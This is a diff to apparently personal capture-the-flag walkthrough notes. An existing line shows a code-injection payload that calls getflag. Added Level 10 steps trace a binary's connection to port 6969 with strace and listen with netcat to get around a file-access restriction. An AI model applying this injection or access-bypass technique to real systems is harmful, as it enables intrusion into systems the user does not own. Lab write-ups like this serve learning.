@@ -135,3 +135,9 @@ echo '[x {${`getflag`}}]' > /tmp/exploit.txt
 - Create a decryption program to decrypt token
 
 # Level 10
+- Program to send file and file without access
+```strace ./level10 /tmp/fake 127.0.0.1 2>&1 | grep connect```
+=> Sending in port 6969
+
+- Listen on port 6969 and run both scripts to bypass the access
+=>```nc -lk 6969```
